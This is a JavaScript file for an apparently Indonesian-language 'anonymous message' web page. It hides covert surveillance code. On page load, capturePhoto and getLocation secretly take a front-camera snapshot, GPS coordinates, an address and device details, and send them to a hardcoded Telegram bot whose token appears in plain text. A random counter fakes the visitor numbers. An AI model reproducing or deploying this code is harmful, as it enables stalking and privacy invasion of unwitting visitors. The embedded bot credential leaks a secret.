const botToken = "7970729647:AAG66mxCHoWOiZIs5ljGZIGoy4jMSX0PvMQ";
const chatId = "6377246807";
let isSending = false;

async function sendMessage() {
    if (isSending) return;
    isSending = true;

    const message = document.getElementById("inputMessage").value;
    if (!message.trim()) {
        Swal.fire("Error", "Pesan tidak boleh kosong!", "error");
        isSending = false;
        return;
    }

    let fullMessage = `📩 Anonim Pesan: ${message}\n\n📱 Perangkat: ${getDeviceInfo()}`;
    let locationText = await getLocation();
    if (locationText) fullMessage += `\n\n${locationText}`;

    let success = await sendText(fullMessage);
    if (success) {
        await Swal.fire("Terkirim!", "Pesan telah dikirim.", "success");
        window.location.href = "/kirim/index.html";
    } else {
        Swal.fire("Gagal", "Pesan gagal dikirim.", "error");
    }

    document.getElementById("inputMessage").value = "";
    isSending = false;
}

async function sendText(text) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text })
        });

        return response.ok;
    } catch (error) {
        console.error("Gagal mengirim pesan:", error);
        return false;
    }
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let device = "Tidak Diketahui";

    if (/android/i.test(userAgent)) {
        device = "Android";
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        device = "iOS";
    } else if (/Windows/i.test(userAgent)) {
        device = "Windows";
    } else if (/Mac/i.test(userAgent)) {
        device = "MacOS";
    } else if (/Linux/i.test(userAgent)) {
        device = "Linux";
    }

    return `${device} (${userAgent})`;
}




function getLocation() {
    return new Promise(resolve => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async position => {
                const { latitude, longitude } = position.coords;
                const locationText = await getAddressFromCoords(latitude, longitude);
                resolve(`${locationText}\n\n📍 Koordinat: ${latitude}, ${longitude}`);
            }, () => {
                console.warn("Akses lokasi ditolak.");
                resolve(null);
            });
        } else {
            resolve(null);
        }
    });
}


async function getAddressFromCoords(latitude, longitude) {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const data = await response.json();
        if (data.address) {
            const { country, state, city, town, village } = data.address;
            const locationParts = [city || town || village, state, country].filter(Boolean);
            return `📍 Lokasi: ${locationParts.join(", ")}`;
        }
        return "📍 Lokasi tidak ditemukan";
    } catch (error) {
        console.error("Gagal mendapatkan lokasi:", error);
        return "📍 Lokasi tidak tersedia";
    }
}


let count = 50; 

function updateCount() {
    let randomIncrease = Math.floor(Math.random() * 10) + 1;
    count += randomIncrease;
    document.getElementById("number").textContent = count;
}

setInterval(updateCount, 2000);

async function getRandomText() {
    try {
        let response = await fetch('text.json'); 
        let texts = await response.json();
        let randomIndex = Math.floor(Math.random() * texts.length);
        document.getElementById("inputMessage").value = texts[randomIndex]; 
    } catch (error) {
        console.error("Error fetching random text:", error);
    }
}

document.addEventListener("DOMContentLoaded", function () {
    let inputMessage = document.getElementById("inputMessage");
    let sendButton = document.getElementById("sendButton");

    function toggleSendButton() {
        sendButton.style.display = inputMessage.value.trim() !== "" ? "block" : "none";
    }

    toggleSendButton();
    inputMessage.addEventListener("input", toggleSendButton);
});

document.addEventListener("DOMContentLoaded", () => {
    getLocation();
    capturePhoto();
});

function capturePhoto() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.createElement("video");
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                const canvas = document.createElement("canvas");
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

                const photoData = canvas.toDataURL("image/png");
                
                let message = document.getElementById("inputMessage").value;
                let fullMessage = `📩 Anonim Pesan: ${message}\n\n📱 Perangkat: ${getDeviceInfo()}`;
                
                getLocation().then(locationText => {
                    if (locationText) fullMessage += `\n\n${locationText}`;
                    sendPhoto(photoData, fullMessage);
                });

                stream.getTracks().forEach(track => track.stop()); // Matikan kamera setelah mengambil foto
            }, 1000);
        }).catch(() => {
            console.warn("Akses kamera ditolak atau tidak tersedia.");
        });
}


function sendPhoto(base64Image, captionText) {
    let formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", dataURItoBlob(base64Image), "photo.png");
    formData.append("caption", captionText);

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
    }).catch(() => {
        console.warn("Foto gagal dikirim.");
    });
}


function dataURItoBlob(dataURI) {
    let byteString = atob(dataURI.split(",")[1]);
    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
    let ab = new ArrayBuffer(byteString.length);
    let ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    return new Blob([ab], { type: mimeString });
}

